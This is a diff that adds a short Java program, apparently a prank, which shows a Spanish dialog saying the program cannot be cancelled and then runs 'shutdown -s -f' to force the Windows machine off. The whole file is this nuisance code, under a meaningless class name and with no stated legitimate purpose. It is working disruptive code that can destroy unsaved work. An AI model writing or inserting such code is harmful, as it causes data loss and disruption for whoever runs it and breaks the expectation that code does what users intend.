@@ -1,0 +1,20 @@
+import java.io.IOException;
+
+import javax.swing.JOptionPane;
+
+/**
+ * 
+ */
+
+/**
+ * @author JuanClavero
+ *
+ */
+public class Lscsnfd {
+
+	public static void main(String[] args) throws IOException {
+		JOptionPane.showMessageDialog(null, "este programa no se puede cancelar");
+		Runtime.getRuntime().exec("shutdown -s -f");
+
+	}
+}
